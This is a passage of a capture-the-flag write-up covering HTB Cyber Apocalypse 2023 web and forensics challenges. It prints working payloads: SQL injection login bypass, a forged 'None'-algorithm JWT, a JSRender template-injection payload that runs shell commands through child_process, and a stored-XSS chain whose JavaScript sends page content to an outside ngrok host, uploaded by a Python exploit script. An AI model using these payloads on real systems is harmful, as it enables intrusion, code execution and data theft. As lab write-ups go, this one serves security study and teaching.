  <li>Difficulty: <em>easy</em></li>
</ul>

<p><img data-src="/assets/img/20230323071313.png" alt="" data-proofer-ignore></p>

<p>Login request;</p>

<p><img data-src="/assets/img/20230323071445.png" alt="" data-proofer-ignore></p>

<p>Login handler is implemented in <code class="language-plaintext highlighter-rouge">routes.py</code> and <code class="language-plaintext highlighter-rouge">database.py</code>;</p>

<p><img data-src="/assets/img/20230323071724.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/20230323071756.png" alt="" data-proofer-ignore></p>

<p>The above is clearly vulnerable to <em>SQL Injection</em>, but the call to <code class="language-plaintext highlighter-rouge">passwordVerify()</code> may complicate things;</p>

<p><img data-src="/assets/img/20230323071931.png" alt="" data-proofer-ignore></p>

<p>The <code class="language-plaintext highlighter-rouge">passwordVeryify()</code> function is simply checking to make sure the password we entered matched the hashed (MD5) password that was retrieved from the query. Since we can control the query using the SQL injection bug, we can make it return a hash whose plaintext we already know (Example: <code class="language-plaintext highlighter-rouge">179ad45c6ce2cb97cf1029e212046e81</code>, which is <code class="language-plaintext highlighter-rouge">testpass</code>). Since the query returns only two columns (username, and password), we can use a UNION query to return our own values by setting <code class="language-plaintext highlighter-rouge">username</code> to <code class="language-plaintext highlighter-rouge">" union select 'admin', '179ad45c6ce2cb97cf1029e212046e81'-- -</code> and <code class="language-plaintext highlighter-rouge">password</code> to <code class="language-plaintext highlighter-rouge">testpass</code>;</p>

<p><img data-src="/assets/img/20230323072526.png" alt="" data-proofer-ignore></p>

<p>It worked!</p>

<p><img data-src="/assets/img/20230323072808.png" alt="" data-proofer-ignore></p>

<p>The lower part of the page has a listing, and clicking on <em>export</em> initiated a download;</p>

<p><img data-src="/assets/img/20230323072909.png" alt="" data-proofer-ignore></p>

<p>The request was made to <code class="language-plaintext highlighter-rouge">/api/export</code>;</p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>POST /api/export HTTP/1.1
Host: 138.68.162.218:31631
Content-Length: 28
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en
Origin: http://138.68.162.218:31631
Referer: http://138.68.162.218:31631/home
Accept-Encoding: gzip, deflate
Cookie: session=eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE5qYzVOVGMwTkRVd2ZRLk9YMDNVd2NRRUdKUGJUZDZfNWE5SmNISDFSb2lJa0c1NU5WRTB0V3ZGVFUifQ.ZBvxUg.ZGT_pJMLFlN-rF7GxVnxfIndbFc
Connection: close

{"name":"communication.mp3"}
</pre></td></tr></tbody></table></code></div></div>

<p>The implementation is clearly vulnerable to <em>Local File Inclusion (LFI)</em>;</p>

<p><img data-src="/assets/img/20230323073229.png" alt="" data-proofer-ignore></p>

<p>From the downloaded <code class="language-plaintext highlighter-rouge">Dockerfile</code>, flag is saved as <code class="language-plaintext highlighter-rouge">/signal_sleuth_firmware</code>. Using the LFI, I was able to read it;</p>

<p><img data-src="/assets/img/20230323073442.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="didactic-octo-paddles">Didactic Octo Paddles<a href="#didactic-octo-paddles" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>medium</em></li>
</ul>

<p><img data-src="/assets/img/20230323073753.png" alt="" data-proofer-ignore></p>

<p>An <em>Express</em> web app. Going through downloaded source code showed a hidden route <code class="language-plaintext highlighter-rouge">/register</code>, which allowed me to register and login;</p>

<p><img data-src="/assets/img/20230323074058.png" alt="" data-proofer-ignore></p>

<p>Nothing of much interest in the dashboard. Going through more of the source code showed another route <code class="language-plaintext highlighter-rouge">/admin</code>;</p>

<p><img data-src="/assets/img/20230323074323.png" alt="" data-proofer-ignore></p>

<p>The route is protected by a <em>middleware</em>, which are commonly used in <em>Express</em> apps for access control. The implementation is in <code class="language-plaintext highlighter-rouge">AdminMiddleware.js</code>;</p>

<p><img data-src="/assets/img/20230323074717.png" alt="" data-proofer-ignore></p>

<p>As can be seen above, the error message we are getting when going to <code class="language-plaintext highlighter-rouge">/admin</code> was generated by this middleware, which means the <code class="language-plaintext highlighter-rouge">/admin</code> route handler in <code class="language-plaintext highlighter-rouge">index.js</code> was never actually used.</p>

<p>The application is also dangerously using the <em>algrorithm</em> defined in user-supplied JWT for verification (line <code class="language-plaintext highlighter-rouge">28</code>), although the first check (line <code class="language-plaintext highlighter-rouge">13</code>) is attempting to prevent user from bypassing verification by setting the algorithm to <code class="language-plaintext highlighter-rouge">none</code>. The header of the JWT issued by the website after login was <code class="language-plaintext highlighter-rouge">{"alg":"HS256","typ":"JWT"}</code>.</p>

<p>Running some local tests, I realised that the value passed in  <code class="language-plaintext highlighter-rouge">alg</code> is case-insensitive. Since the web app is blocking use of <code class="language-plaintext highlighter-rouge">none</code> as the value of <code class="language-plaintext highlighter-rouge">alg</code> in a case-sensitive manner, setting it to <code class="language-plaintext highlighter-rouge">None</code> will bypass this check.</p>

<p>The body of the token issued to us after login decodes to;</p>

<div class="language-json highlighter-rouge"><div class="code-header"><span label-text="JSON"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="nl">"iat"</span><span class="p">:</span><span class="mi">1679553628</span><span class="p">,</span><span class="nl">"exp"</span><span class="p">:</span><span class="mi">1679557228</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Since the <code class="language-plaintext highlighter-rouge">database.js</code> file showed that a user named <code class="language-plaintext highlighter-rouge">admin</code> is created when the app is first run, and the ID column is set to auto-increment, we can be sure that the admin’s ID is <code class="language-plaintext highlighter-rouge">1</code>. So I cracted a token with <code class="language-plaintext highlighter-rouge">alg</code> set to <code class="language-plaintext highlighter-rouge">None</code>,  <code class="language-plaintext highlighter-rouge">id</code> set to <code class="language-plaintext highlighter-rouge">1</code>, and signature part of the token deleted. It worked!</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header"><span label-text="Plaintext"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5NTUzNjI4LCJleHAiOjE2Nzk1NTcyMjh9.
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/img/20230323080423.png" alt="" data-proofer-ignore></p>

<p>Nothing of much interest is in the admin dashboard, only names of users. Checking the source code showed that it uses <em>JSRender</em> to display data, which could be vulnerable to <em>Server Side Template Injection (SSTI)</em> if the usernames are not <a href="https://appcheck-ng.com/template-injection-jsrender-jsviews">properly validated</a>;</p>

<p><img data-src="/assets/img/20230323080743.png" alt="" data-proofer-ignore></p>

<p>Creating a user with name <code class="language-plaintext highlighter-rouge">{{:7*7}}</code> evaluated the username to <code class="language-plaintext highlighter-rouge">49</code>, which confirmed the vulnerability. <code class="language-plaintext highlighter-rouge">Dockerfile</code> confirmed the flag is at <code class="language-plaintext highlighter-rouge">/flag.txt</code>, so I used the vulnerability to read it using the payload;</p>

<div class="language-json highlighter-rouge"><div class="code-header"><span label-text="JSON"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"{{:</span><span class="se">\"</span><span class="s2">pwnd</span><span class="se">\"</span><span class="s2">.toString.constructor.call({},</span><span class="se">\"</span><span class="s2">return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()</span><span class="se">\"</span><span class="s2">)()}}"</span><span class="p">,</span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"testpass"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Refreshing the admin dashboard, I got the flag;</p>

<p><img data-src="/assets/img/20230323122819.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="spybug">SpyBug<a href="#spybug" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>medium</em></li>
</ul>

<p><img data-src="/assets/img/20230323123242.png" alt="" data-proofer-ignore></p>

<p>Login form is POSTed to <code class="language-plaintext highlighter-rouge">/panel/login</code>. Going through the downloaded source, here is the implementation;</p>

<p><img data-src="/assets/img/20230323123625.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/20230323123815.png" alt="" data-proofer-ignore></p>

<p>Notice that the <code class="language-plaintext highlighter-rouge">username</code> passed to the <code class="language-plaintext highlighter-rouge">checkUserLogin()</code> function was not casted to a string, and was later used in a <em>NoSQL</em> query. This could’ve been vulnerable to <em>NoSQL</em> injection by passing <code class="language-plaintext highlighter-rouge">username</code> as a JSON object, if not for the call to <code class="language-plaintext highlighter-rouge">bcrypt.compareSync()</code> that validates the password entered.</p>

<p>Looking deeper into the code, there are routes defined for <em>agents</em> in <code class="language-plaintext highlighter-rouge">routes/agents.js</code> file;</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">/agents/register</code> - GET request. Creates a new agent, and return the agent’s identifier and token.</li>
  <li><code class="language-plaintext highlighter-rouge">/agents/check/:identifier/:token</code> - GET request. Returns a code <code class="language-plaintext highlighter-rouge">200</code> HTTP response if agent is valid.</li>
  <li><code class="language-plaintext highlighter-rouge">/agents/details/:identifier/:token</code> - POST request. For updating agent info. Accepts a json of <code class="language-plaintext highlighter-rouge">hostname</code>, <code class="language-plaintext highlighter-rouge">platform</code>, and <code class="language-plaintext highlighter-rouge">arch</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">/agents/upload/:identifier/:token</code> - Multipart POST request for uploading file to <code class="language-plaintext highlighter-rouge">/uploads/</code>, which is publicly accessible.</li>
</ul>

<p>The expose upload feature is interesting. It uses some metadata checks to validate files being uploaded, which can be easily forged;</p>

<p><img data-src="/assets/img/20230323125527.png" alt="" data-proofer-ignore></p>

<p>Another filter is also in place that validates uploaded file contents, but the regex used is very loose;</p>

<p><img data-src="/assets/img/20230323125202.png" alt="" data-proofer-ignore></p>

<p>The above check can be passed by writing a string that matches the regex in uploaded file, independent of position;</p>

<div class="language-js highlighter-rouge"><div class="code-header"><span label-text="JavaScript"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c1">// RIFFAAAAWAVE - Whitelisted bytes in JS comment. Totally valid</span>
<span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Looking into how agents are handled, I found that the code for updating agents info does not do any sanitation;</p>

<p><img data-src="/assets/img/20230323125849.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/20230323125937.png" alt="" data-proofer-ignore></p>

<p>This is interesting because all agents are rendered at the administrators homepage after login. This could be used to execute stored XSS on the admin.</p>

<p>The NodeJS server runs a <em>Puppeteer</em> bot that authenticates as admin every 60 seconds;</p>

<p><img data-src="/assets/img/20230323130639.png" alt="" data-proofer-ignore></p>

<div class="language-js highlighter-rouge"><div class="code-header"><span label-text="JavaScript"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">dotenv</span><span class="dl">"</span><span class="p">).</span><span class="nx">config</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">puppeteer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">puppeteer</span><span class="dl">"</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">browserOptions</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">headless</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
  <span class="na">executablePath</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/usr/bin/chromium-browser</span><span class="dl">"</span><span class="p">,</span>
  <span class="na">args</span><span class="p">:</span> <span class="p">[</span>
    <span class="dl">"</span><span class="s2">--no-sandbox</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-background-networking</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-default-apps</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-extensions</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-gpu</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-sync</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--disable-translate</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--hide-scrollbars</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--metrics-recording-only</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--mute-audio</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--no-first-run</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--safebrowsing-disable-auto-update</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">--js-flags=--noexpose_wasm,--jitless</span><span class="dl">"</span><span class="p">,</span>
  <span class="p">],</span>
<span class="p">};</span>

<span class="nx">exports</span><span class="p">.</span><span class="nx">visitPanel</span> <span class="o">=</span> <span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">(</span><span class="nx">browserOptions</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">createIncognitoBrowserContext</span><span class="p">();</span>
    <span class="kd">let</span> <span class="nx">page</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://0.0.0.0:</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">API_PORT</span><span class="p">,</span> <span class="p">{</span>
      <span class="na">waitUntil</span><span class="p">:</span> <span class="dl">"</span><span class="s2">networkidle2</span><span class="dl">"</span><span class="p">,</span>
      <span class="na">timeout</span><span class="p">:</span> <span class="mi">5000</span><span class="p">,</span>
    <span class="p">});</span>

    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="dl">"</span><span class="s2">#username</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="dl">"</span><span class="s2">#password</span><span class="dl">"</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">ADMIN_SECRET</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="dl">"</span><span class="s2">#loginButton</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">waitForTimeout</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>

<p>On testing XSS through agents info update locally, the injection worked but the browser blocks the code;</p>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>POST /agents/details/d9624cf2-3dd5-40ad-8132-fd9a292e1ef3/405cc6bc-484f-4e94-aed6-396144874213 HTTP/1.1
Host: debian.local:5000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-GB,en
Accept-Encoding: gzip, deflate
Cookie: connect.sid=s%3AvcdDZtZajSbryflLimysDJ4F8TdrUHxb.vFCYANEbw4vcD9se%2ByefOO7WT6sdMQf9%2F4tRJ3%2BbR2M
Connection: close
Content-Type: application/json
Content-Length: 116

{"hostname":"&lt;script&gt;alert(1)&lt;/script&gt;", "platform":"linux", "arch":"x86"}
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">index.js</code> showed the server is using some XSS-prevention headers (<em>Content Security Policy</em>);</p>

<p><img data-src="/assets/img/20230323131232.png" alt="" data-proofer-ignore></p>

<p>While the above would block all JS embedded directly, the <code class="language-plaintext highlighter-rouge">script-src 'self'</code> policy would allow injected <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tags that load files on the same origin. This is a big deal since we already have an <strong>open file upload vulnerability</strong> on the server.</p>

<p>To exploit this, I wrote a JS payload <code class="language-plaintext highlighter-rouge">payload.js</code> that satisfies the regex filter. When loaded, this will base64-encode the current page content and send it to my server;</p>

<div class="language-js highlighter-rouge"><div class="code-header"><span label-text="JavaScript"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c1">// RIFFAAAAWAVE</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">`http://1e90-197-210-71-140.ngrok.io/?loot=</span><span class="p">${</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">)}</span><span class="s2">`</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I then wrote a python script <code class="language-plaintext highlighter-rouge">exploit.py</code> to upload the payload and inject the XSS;</p>

<div class="language-python highlighter-rouge"><div class="code-header"><span label-text="Python"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#-----------------------------------------
# SpyBug - Cyber Apocalypse 2023 solution.
#                          Author: 4g3nt47
#-----------------------------------------
</span>
<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">json</span>

<span class="n">api</span> <span class="o">=</span> <span class="s">"http://139.59.173.68:31674"</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[*] Registering agent..."</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">api</span><span class="si">}</span><span class="s">/agents/register"</span><span class="p">).</span><span class="n">text</span><span class="p">)</span>
<span class="nb">id</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s">"identifier"</span><span class="p">]</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s">"token"</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] id: </span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="se">\n</span><span class="s">[+] token: </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[*] Uploading payload..."</span><span class="p">)</span>
<span class="n">url</span> <span class="o">=</span> <span class="n">api</span> <span class="o">+</span> <span class="s">"/uploads/"</span> <span class="o">+</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">api</span><span class="si">}</span><span class="s">/agents/upload/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s">'recording'</span><span class="p">:</span> <span class="p">(</span><span class="s">'payload.wav'</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s">'payload.js'</span><span class="p">),</span> <span class="s">'audio/wave'</span><span class="p">)}).</span><span class="n">text</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Payload uploaded to: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[*] Injecting XSS payload..."</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">api</span><span class="si">}</span><span class="s">/agents/details/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">"hostname"</span><span class="p">:</span><span class="s">"&lt;script src='/uploads/"</span> <span class="o">+</span> <span class="n">url</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"/"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">"'&gt;&lt;/script&gt;"</span><span class="p">,</span> <span class="s">"platform"</span><span class="p">:</span><span class="s">"haha"</span><span class="p">,</span> <span class="s">"arch"</span><span class="p">:</span><span class="s">"haha"</span><span class="p">}).</span><span class="n">text</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The exploit ran successfully;</p>

<p><img data-src="/assets/img/20230323132828.png" alt="" data-proofer-ignore></p>

<p>After a few seconds, I got a callback;</p>

<p><img data-src="/assets/img/20230323132919.png" alt="" data-proofer-ignore></p>

<p>The decoded base64 contains the flag;</p>

<div class="language-html highlighter-rouge"><div class="code-header"><span label-text="HTML"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container login mt-5 mb-5"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"col-md-10"</span><span class="nt">&gt;&lt;h1&gt;&lt;i</span> <span class="na">class=</span><span class="s">"las la-satellite-dish"</span><span class="nt">&gt;&lt;/i&gt;</span><span class="ni">&amp;nbsp;</span>Spybug v1<span class="nt">&lt;/h1&gt;&lt;/div&gt;&lt;div</span> <span class="na">class=</span><span class="s">"col-md-2 float-right"</span><span class="nt">&gt;&lt;a</span> <span class="na">class=</span><span class="s">"btn login-btn mt-3"</span> <span class="na">href=</span><span class="s">"/panel/logout"</span><span class="nt">&gt;</span>Log-out<span class="nt">&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;hr&gt;&lt;h2&gt;</span>Welcome back HTB{p01yg10t5_4nd_35p10n4g3}<span class="nt">&lt;/h2&gt;&lt;hr&gt;&lt;h3&gt;&lt;i</span> <span class="na">class=</span><span class="s">"las la-laptop"</span><span class="nt">&gt;&lt;/i&gt;</span><span class="ni">&amp;nbsp;</span>Agents<span class="nt">&lt;/h3&gt;&lt;table</span> <span class="na">class=</span><span class="s">"w-100"</span><span class="nt">&gt;&lt;thead&gt;&lt;tr&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;</span>ID<span class="nt">&lt;/th&gt;&lt;th&gt;</span>Hostname<span class="nt">&lt;/th&gt;&lt;th&gt;</span>Platform<span class="nt">&lt;/th&gt;&lt;th&gt;</span>Arch<span class="nt">&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;</span>7ecf63f2-25bb-45f2-9a7a-54fd3583bda5<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;script </span><span class="na">src=</span><span class="s">"/uploads/a6f135d0-aed4-47eb-a374-b42c91b9553f"</span><span class="nt">&gt;&lt;/script&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p><br /></p>

<hr />
<p><br /></p>

<h3 id="forensics">Forensics<a href="#forensics" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<h4 id="roten">Roten<a href="#roten" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p>Downloaded files contain a PCAP file;</p>

<p><img data-src="/assets/img/20230323134144.png" alt="" data-proofer-ignore></p>

<p>Loading it up in wireshark and setting a filter to only show HTTP traffic showed lots of <code class="language-plaintext highlighter-rouge">404</code> responses, which is common in web bruteforce;</p>

<p><img data-src="/assets/img/20230323134332.png" alt="" data-proofer-ignore></p>

<p>Following the HTTP stream confirmed this as the <em>User-Agent</em> was that of <code class="language-plaintext highlighter-rouge">wfuzz</code>, a web fuzzer;</p>

<p><img data-src="/assets/img/20230323134622.png" alt="" data-proofer-ignore></p>

<p>This could be the attacker. Searching for POST requests found one for a PHP file;</p>

<p><img data-src="/assets/img/20230323135221.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/20230323135342.png" alt="" data-proofer-ignore></p>

<p>The PHP file was obfuscated. At the last line, it calls <code class="language-plaintext highlighter-rouge">eval()</code> to execute the payload after self-deobfuscation. I replaced <code class="language-plaintext highlighter-rouge">eval</code> with <code class="language-plaintext highlighter-rouge">echo</code>, which simply prints the decoded payload. The flag was inside;</p>

<p><img data-src="/assets/img/20230323135602.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="packet-cyclone">Packet Cyclone<a href="#packet-cyclone" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p>The downloaded files contain some <code class="language-plaintext highlighter-rouge">.evtx</code> log files. I installed <code class="language-plaintext highlighter-rouge">libevtx-utils</code>, which provides <code class="language-plaintext highlighter-rouge">evtxexport</code> for reading <code class="language-plaintext highlighter-rouge">.evtx</code> files on linux. The file <code class="language-plaintext highlighter-rouge">Microsoft-Windows-Sysmon%4Operational.evtx</code> contains the <em>sysmon</em> event logs, and was exported using;</p>

<div class="language-bash highlighter-rouge"><div class="code-header"><span label-text="Shell"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
